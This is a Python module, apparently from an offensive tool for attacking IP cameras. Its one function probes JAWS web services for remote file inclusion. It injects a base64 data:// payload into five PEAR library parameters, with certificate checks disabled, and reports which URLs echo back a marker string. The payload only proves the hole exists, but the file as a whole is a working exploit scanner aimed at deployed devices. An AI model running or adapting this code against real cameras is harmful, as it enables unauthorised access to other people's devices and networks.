import requests
from config import INFO, LINE, WARNING, LESS
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def jaws_exploit(camera, url, s):
    get_version = s.get(url, verify=False)
    if "JAWS/1.0" in get_version.headers['Server']:
        print("{}Nothing vulnerability known for the JAWS v.1".format(LESS))
    else:
        payload = "data://text/plain;base64,RXhwbG9pdF9ieV9jYW1ja3I="
        # Test RFI vuln of jaws camera
        vulns = {
                "jaws/libraries/pear/MDB2.php?file_name={}".format(payload),
                "jaws/libraries/pear/MDB2.php?file_name={}".format(payload),
                "jaws/libraries/pear/Services/Weather.php?service={}".format(payload),
                "jaws/libraries/pear/SOAP/Transport.php?transport_include={}".format(payload),
                "jaws/libraries/pear/Crypt/RSA/MathLoader.php?class_filename={}".format(payload)
            }
        print("Payload: {}".format(payload))
        for v in vulns:
            url_exploit = "{}{}".format(url, v)
            req = s.get(url_exploit, verify=False, allow_redirects=False)
            print("{}Testing vulnerability: {}".format(INFO, v))
            if "Exploit_by_camckr" in req.text:
                print("{}Vulnerability worked, go on: \n => {}\n".format(WARNING, url_exploit))


